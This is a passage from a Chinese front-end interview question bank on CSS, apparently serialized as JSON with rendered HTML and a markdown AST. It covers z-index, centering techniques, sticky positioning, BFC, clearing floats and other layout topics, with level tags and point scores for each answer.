的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。</p>\\n</li>\\n<li><p>父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；</p>\\n</li>\\n<li><p>元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；</p>\\n</li>\\n<li><p>元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；</p>\\n</li>\\n</ul>\\n<h2>如何根据设计稿进行移动端适配？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>移动端适配主要有两个维度：</p>\\n</li>\\n<li><p>适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；</p>\\n</li>\\n<li><p>适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。</p>\\n</li>\\n<li><p>为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。</p>\\n</li>\\n</ul>\\n<h2>实现一个扇形</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li>用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：</li>\\n</ul>\\n<pre><code class=\\"language-css\\">div{\\n    border: 100px solid transparent;\\n    width: 0;\\n    heigt: 0;\\n    border-radius: 100px;\\n    border-top-color: red;\\n}\\n</code></pre>\\n<h2>画一条0.5px的线</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li>采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：</li>\\n</ul>\\n<pre><code class=\\"language-css\\">transform: scale(0.5,0.5);\\n</code></pre>\\n<ul>\\n<li>采用meta viewport的方式</li>\\n</ul>\\n<pre><code class=\\"language-html\\">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=0.5, minimum-scale=0.5, maximum-scale=0.5&quot;/&gt;\\n</code></pre>\\n<h2>对 sticky 定位的理解</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。</p>\\n</li>\\n<li><p>粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。</p>\\n</li>\\n</ul>\\n<h2>display:inline-block 什么时候会显示间隙？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>有空格时会有间隙，可以删除空格解决；</p>\\n</li>\\n<li><p>margin正值时，可以让margin使用负值解决；</p>\\n</li>\\n<li><p>使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；</p>\\n</li>\\n</ul>\\n<h2>::before 和 :after 的双冒号和单冒号有什么区别？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li>冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。</li>\\n</ul>\\n<h2>CSS 居中</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：定位居中</strong></li>\\n</ul>\\n<p>①已知大小的元素在屏幕窗口水平垂直都居中</p>\\n<pre><code class=\\"language-html\\">&lt;!DOCTYPE html&gt;\\n&lt;html lang=&quot;en&quot;&gt;\\n&lt;head&gt;\\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\\n    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\\n    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;\\n    &lt;title&gt;&lt;/title&gt;\\n    &lt;style&gt;\\n        .box{\\n            width:100px;\\n            height:100px;\\n            background-color: aqua;\\n            position:fixed;\\n            left:50%;\\n            top:50%;\\n            margin-left:-50px;\\n            margin-top:-50px;\\n        }\\n    &lt;/style&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n    &lt;div class=&quot;box&quot;&gt;\\n\\n    &lt;/div&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n</code></pre>\\n<p>②未知大小的元素在屏幕窗口水平垂直都居中</p>\\n<pre><code class=\\"language-html\\">&lt;!DOCTYPE html&gt;\\n&lt;html lang=&quot;en&quot;&gt;\\n&lt;head&gt;\\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\\n    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\\n    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;\\n    &lt;title&gt;&lt;/title&gt;\\n    &lt;style&gt;\\n        .box{\\n            position:fixed;\\n            left:0;\\n            top:0;\\n            right:0;\\n            bottom:0;\\n            margin:auto;\\n        }\\n    &lt;/style&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n    &lt;div class=&quot;box&quot;&gt;\\n\\n    &lt;/div&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n</code></pre>\\n<ul>\\n<li><strong>1：子元素在父元素中居中</strong></li>\\n</ul>\\n<p>①已知大小的子元素在父元素中居中</p>\\n<pre><code class=\\"language-css\\">    父元素{\\n        /* 相对定位 */\\n        position: relative;\\n    }\\n    子元素{\\n        width:100px;\\n        height:100px;\\n        /* 绝对定位 */\\n        position:absolute;\\n        left:50%;\\n        top:50%;\\n        margin-left:-50px;\\n        margin-top:-50px;\\n    }\\n</code></pre>\\n<p>②未知大小的子元素在父元素中居中</p>\\n<pre><code class=\\"language-css\\">  父元素{\\n      /* 相对定位 */\\n      position: relative;\\n  }\\n  子元素{\\n      /* 绝对定位 */\\n      position:absolute;\\n      left:0;\\n      top:0;\\n      right:0;\\n      bottom:0;\\n      margin:auto;\\n  }\\n</code></pre>\\n<ul>\\n<li><strong>1：使用弹性布局</strong></li>\\n</ul>\\n<p>① 使用flex布局的方式实现未知大小元素在屏幕窗口水平垂直都居中</p>\\n<pre><code class=\\"language-css\\">  html,body{\\n      height:100%;\\n  }\\n  /* 让html和body的高度为屏幕窗口的高度（窗口高度自适应） */\\n  body{\\n      display:flex;\\n      justify-content:center;\\n      align-items:center;\\n  }\\n</code></pre>\\n<p>② 使用flex布局的方式实现未知大小的子元素在父元素中水平垂直都居中**</p>\\n<pre><code class=\\"language-css\\">  父元素 {\\n      display:flex;\\n      justify-content:center;\\n      align-items:center;\\n  }\\n    \\n</code></pre>\\n<ul>\\n<li><strong>1：使用css3变形来实现</strong></li>\\n</ul>\\n<p>① 使用css3变形的方式实现未知大小的元素在屏幕窗口水平垂直都居中</p>\\n<pre><code class=\\"language-css\\">  元素{\\n      position:fixed;\\n      left:50%;\\n      top:50%;\\n      transform:translateX(-50%) translateY(-50%);\\n  }\\n</code></pre>\\n<p>② 使用css变形的方式来实现未知大小的子元素，在父元素中水平垂直都居中</p>\\n<pre><code class=\\"language-css\\">  父元素{\\n      position:relative;\\n  }\\n  子元素{\\n      position:absolute;\\n      left:50%;\\n      top:50%;\\n      transform:translate(-50%,-50%);\\n  }\\n</code></pre>\\n</details>\\n","ast":[{"type":"heading","raw":"# CSS\\n\\n","depth":1,"text":"CSS","tokens":[{"type":"text","raw":"CSS","text":"CSS","escaped":false}]},{"type":"heading","raw":"## CSS 有哪些选择器？权重是如何计算的？\\n\\n","depth":2,"text":"CSS 有哪些选择器？权重是如何计算的？","tokens":[{"type":"text","raw":"CSS 有哪些选择器？权重是如何计算的？","text":"CSS 有哪些选择器？权重是如何计算的？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：**\\n  + 基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器\\n  + 关系选择器：后代选择器、父子选择器、兄弟选择器\\n- **1：** ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**\\n  + 基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器\\n  + 关系选择器：后代选择器、父子选择器、兄弟选择器\\n","task":false,"loose":false,"text":"**1：**\\n+ 基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器\\n+ 关系选择器：后代选择器、父子选择器、兄弟选择器","tokens":[{"type":"text","raw":"**1：**\\n","text":"**1：**","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]}]},{"type":"list","raw":"+ 基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器\\n+ 关系选择器：后代选择器、父子选择器、兄弟选择器","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器\\n","task":false,"loose":false,"text":"基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器","tokens":[{"type":"text","raw":"基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器","text":"基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器","tokens":[{"type":"text","raw":"基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器","text":"基本选择器：ID 选择器 > 类选择器/伪类选择器/属性选择器 > 元素选择器/伪元素选择器 > 通配符选择器","escaped":false}]}]},{"type":"list_item","raw":"+ 关系选择器：后代选择器、父子选择器、兄弟选择器","task":false,"loose":false,"text":"关系选择器：后代选择器、父子选择器、兄弟选择器","tokens":[{"type":"text","raw":"关系选择器：后代选择器、父子选择器、兄弟选择器","text":"关系选择器：后代选择器、父子选择器、兄弟选择器","tokens":[{"type":"text","raw":"关系选择器：后代选择器、父子选择器、兄弟选择器","text":"关系选择器：后代选择器、父子选择器、兄弟选择器","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","task":false,"loose":false,"text":"**1：** ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","tokens":[{"type":"text","raw":"**1：** ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","text":"**1：** ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","text":" ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## margin 和 padding 的使用场景\\n\\n","depth":2,"text":"margin 和 padding 的使用场景","tokens":[{"type":"text","raw":"margin 和 padding 的使用场景","text":"margin 和 padding 的使用场景","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**\\n  + 需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n  + 需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**\\n  + 需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n  + 需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","task":false,"loose":false,"text":"**1：**\\n+ 需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n+ 需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","tokens":[{"type":"text","raw":"**1：**\\n","text":"**1：**","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]}]},{"type":"list","raw":"+ 需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n+ 需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；\\n","task":false,"loose":false,"text":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；","tokens":[{"type":"text","raw":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；","text":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；","tokens":[{"type":"text","raw":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；","text":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；","escaped":false}]}]},{"type":"list_item","raw":"+ 需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","task":false,"loose":false,"text":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","tokens":[{"type":"text","raw":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","text":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","tokens":[{"type":"text","raw":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","text":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何清除浮动?\\n\\n","depth":2,"text":"如何清除浮动?","tokens":[{"type":"text","raw":"如何清除浮动?","text":"如何清除浮动?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：**\\n  .clearfix{\\n    clear:both;\\n    content:\'\';\\n    display:block;\\n    width: 0;\\n    height: 0;\\n    visibility:hidden;\\n  }","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：**\\n  .clearfix{\\n    clear:both;\\n    content:\'\';\\n    display:block;\\n    width: 0;\\n    height: 0;\\n    visibility:hidden;\\n  }","task":false,"loose":false,"text":"**2：**\\n.clearfix{\\n  clear:both;\\n  content:\'\';\\n  display:block;\\n  width: 0;\\n  height: 0;\\n  visibility:hidden;\\n}","tokens":[{"type":"text","raw":"**2：**\\n\\n.clearfix{\\n\\n  clear:both;\\n\\n  content:\'\';\\n\\n  display:block;\\n\\n  width: 0;\\n\\n  height: 0;\\n\\n  visibility:hidden;\\n\\n}","text":"**2：**\\n.clearfix{\\n  clear:both;\\n  content:\'\';\\n  display:block;\\n  width: 0;\\n  height: 0;\\n  visibility:hidden;\\n}","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":"\\n.clearfix{\\n  clear:both;\\n  content:\'\';\\n  display:block;\\n  width: 0;\\n  height: 0;\\n  visibility:hidden;\\n}","text":"\\n.clearfix{\\n  clear:both;\\n  content:\'\';\\n  display:block;\\n  width: 0;\\n  height: 0;\\n  visibility:hidden;\\n}","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 使元素消失的方法?\\n\\n","depth":2,"text":"使元素消失的方法?","tokens":[{"type":"text","raw":"使元素消失的方法?","text":"使元素消失的方法?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**\\n  + visibility:hidden;\\n  + display:none;\\n  + opacity:0;\\n  + z-index:-1;","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**\\n  + visibility:hidden;\\n  + display:none;\\n  + opacity:0;\\n  + z-index:-1;","task":false,"loose":false,"text":"**1：**\\n+ visibility:hidden;\\n+ display:none;\\n+ opacity:0;\\n+ z-index:-1;","tokens":[{"type":"text","raw":"**1：**\\n","text":"**1：**","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]}]},{"type":"list","raw":"+ visibility:hidden;\\n+ display:none;\\n+ opacity:0;\\n+ z-index:-1;","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ visibility:hidden;\\n","task":false,"loose":false,"text":"visibility:hidden;","tokens":[{"type":"text","raw":"visibility:hidden;","text":"visibility:hidden;","tokens":[{"type":"text","raw":"visibility:hidden;","text":"visibility:hidden;","escaped":false}]}]},{"type":"list_item","raw":"+ display:none;\\n","task":false,"loose":false,"text":"display:none;","tokens":[{"type":"text","raw":"display:none;","text":"display:none;","tokens":[{"type":"text","raw":"display:none;","text":"display:none;","escaped":false}]}]},{"type":"list_item","raw":"+ opacity:0;\\n","task":false,"loose":false,"text":"opacity:0;","tokens":[{"type":"text","raw":"opacity:0;","text":"opacity:0;","tokens":[{"type":"text","raw":"opacity:0;","text":"opacity:0;","escaped":false}]}]},{"type":"list_item","raw":"+ z-index:-1;","task":false,"loose":false,"text":"z-index:-1;","tokens":[{"type":"text","raw":"z-index:-1;","text":"z-index:-1;","tokens":[{"type":"text","raw":"z-index:-1;","text":"z-index:-1;","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 理解BFC吗？\\n\\n","depth":2,"text":"理解BFC吗？","tokens":[{"type":"text","raw":"理解BFC吗？","text":"理解BFC吗？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**\\n  BFC 即 Block Formatting Contexts (块级格式化上下文)。  \\n  具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。  \\n  通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**\\n  BFC 即 Block Formatting Contexts (块级格式化上下文)。  \\n  具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。  \\n  通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","task":false,"loose":false,"text":"**1：**\\nBFC 即 Block Formatting Contexts (块级格式化上下文)。  \\n具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。  \\n通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","tokens":[{"type":"text","raw":"**1：**\\n\\nBFC 即 Block Formatting Contexts (块级格式化上下文)。  \\n\\n具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。  \\n\\n通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","text":"**1：**\\nBFC 即 Block Formatting Contexts (块级格式化上下文)。  \\n具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。  \\n通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"\\nBFC 即 Block Formatting Contexts (块级格式化上下文)。","text":"\\nBFC 即 Block Formatting Contexts (块级格式化上下文)。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。","text":"具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","text":"通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 解释 CSS 中的 flex 布局，并列举一些常用的 flex 属性及其作用\\n\\n","depth":2,"text":"解释 CSS 中的 flex 布局，并列举一些常用的 flex 属性及其作用","tokens":[{"type":"text","raw":"解释 CSS 中的 flex 布局，并列举一些常用的 flex 属性及其作用","text":"解释 CSS 中的 flex 布局，并列举一些常用的 flex 属性及其作用","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 